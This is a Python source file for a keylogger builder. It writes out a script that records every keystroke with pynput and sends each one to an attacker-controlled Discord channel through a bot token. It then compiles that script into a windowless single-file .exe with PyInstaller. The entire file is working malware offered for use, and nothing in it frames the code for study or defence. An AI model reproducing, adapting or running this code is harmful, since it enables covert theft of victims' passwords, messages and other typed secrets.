# services/keylogger.py

import discord
from discord.ext import commands
import sys
import subprocess
import os
import shutil
from dotenv import load_dotenv
from colorama import Fore, Style, init
import asyncio
init(autoreset=True)

def generate_keylogger_script(token: str, channel_id: int):
    code = f"""
import discord
from discord.ext import commands
from pynput import keyboard
import asyncio

TOKEN = "{token}"
CHANNEL_ID = {channel_id}

intents = discord.Intents.default()
intents.message_content = True

bot = commands.Bot(command_prefix="!", intents=intents)
message_queue = asyncio.Queue()

@bot.event
async def on_ready():
    print(f"Logged in as {{bot.user}}")
    bot.loop.create_task(send_messages_task())

async def send_messages_task():
    await bot.wait_until_ready()
    channel = bot.get_channel(CHANNEL_ID)
    while True:
        msg = await message_queue.get()
        try:
            await channel.send(msg)
        except Exception as e:
            print(f"Error sending message: {{e}}")
        await asyncio.sleep(1)

def on_press(key):
    try:
        char = key.char
        asyncio.run_coroutine_threadsafe(
            message_queue.put(f"Key pressed: {{char}}"), bot.loop)
    except AttributeError:
        asyncio.run_coroutine_threadsafe(
            message_queue.put(f"Special key: {{key}}"), bot.loop)

from pynput import keyboard
listener = keyboard.Listener(on_press=on_press)
listener.start()

bot.run(TOKEN)
"""

    with open("keylogger.py", "w") as f:
        f.write(code)
    print("keylogger.py generated successfully.")

def build_exe():
    print("Building keylogger.exe with PyInstaller...")

    subprocess.run([
        sys.executable,
        "-m", "PyInstaller",
        "--onefile",
        "--noconsole",
        "--distpath", "dist",
        "--workpath", "build",
        "keylogger.py"
    ])

    exe_name = "keylogger.exe"
    dist_path = os.path.join("dist", exe_name)
    target_path = os.path.join(os.getcwd(), exe_name)

    # move exe file to the current working directory
    if os.path.exists(dist_path):
        shutil.move(dist_path, target_path)
        print(f"{exe_name} moved to {target_path}")
    else:
        print("Error: exe file not found in dist folder.")

    # clear build and dist folders
    shutil.rmtree("build", ignore_errors=True)
    shutil.rmtree("dist", ignore_errors=True)

    print("Build finished. Cleaned up temporary folders.")

def create_keylogger_exe():
    ask1 = input("Do you want to use the contents of the .env file? (y/n): ").lower()
    if ask1 in ['y', 'yes', 'ye', 'yep', 'yeah', 'es']:
        load_dotenv()
        token = os.getenv("TOKEN")
        channel_id = os.getenv("CHANNEL_ID")
    else:
        token = input("Enter your Discord Bot Token: ").strip()
        channel_id = input("Enter your Discord Channel ID: ").strip()

    # token and channel_id validation
    if not token:
        print(Fore.RED + "Token cannot be empty.")
        return
    if not channel_id or not channel_id.isdigit():
        print(Fore.RED + "Channel ID must be a number and cannot be empty.")
        return

    channel_id = int(channel_id)

    # discord bot login to check token validity
    intents = discord.Intents.default()
    intents.message_content = True
    bot = commands.Bot(command_prefix="!", intents=intents)

    async def check_token():
        try:
            await bot.login(token)
            print(Fore.GREEN + "Token is valid! Proceeding to create keylogger exe...")
            await bot.close()
            # here we can generate the keylogger script and build the exe
            generate_keylogger_script(token, channel_id)
            build_exe()
        except discord.LoginFailure:
            print(Fore.RED + "Invalid Discord Token. Please enter a valid token.")
        except Exception as e:
            print(Fore.RED + f"An error occurred during token validation: {e}")

    # asyncio event loop to run the check_token coroutine
    asyncio.run(check_token())

    confirm = input(f"Generate keylogger .exe with token={token} and channel_id={channel_id}? (y/n): ").lower()
    if confirm != 'y':
        print(f"{Fore.RED}Cancelled.")
        return

    generate_keylogger_script(token, channel_id)
    build_exe()
